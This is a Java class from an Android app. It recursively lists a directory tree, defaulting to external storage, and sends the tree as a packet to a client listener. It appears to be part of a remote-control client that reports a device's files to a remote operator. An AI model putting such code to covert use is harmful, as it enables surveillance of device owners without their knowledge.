package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.client.ClientListener;
import utils.MyFile;
import Packet.FileTreePacket;
import android.os.Environment;

public class DirLister {

	public static boolean listDir(ClientListener c, int channel, String dirname) {
		File f;
		final ArrayList<MyFile> ar = new ArrayList<MyFile>();

		if (dirname.equals("/"))
			f = Environment.getExternalStorageDirectory();
		else
			f = new File(dirname);

		if (!f.exists())
			return false;
		else {
			ar.add(visitAllDirsAndFiles(f));
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}

	public static MyFile visitAllDirsAndFiles(File dir) {

		if (dir.exists())
			if (dir.isDirectory()) {
				final String[] children = dir.list();
				final MyFile myf = new MyFile(dir);
				// ar.add(new MyFile(dir));
				if (children != null)
					if (children.length != 0)
						for (final String child : children)
							// System.out.println(dir.toString()+"/"+child);
							try {
								final File f = new File(dir, child);
								myf.addChild(visitAllDirsAndFiles(f));
							} catch (final Exception e) {
								System.out.println("Child !" + child);
								e.printStackTrace();
							}
				return myf;
			} else
				return new MyFile(dir);
		return null;
	}

	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {

		if (dir.exists())
			if (dir.isDirectory()) {
				final String[] children = dir.list();
				ar.add(new MyFile(dir));
				if (children != null)
					for (final String child : children)
						// System.out.println(dir.toString()+"/"+child);
						try {
							final File f = new File(dir, child);
							visitAllDirsAndFiles(f, ar);
						} catch (final Exception e) {
							System.out.println("Child !" + child);
							e.printStackTrace();
						}
			} else
				ar.add(new MyFile(dir));
	}

}
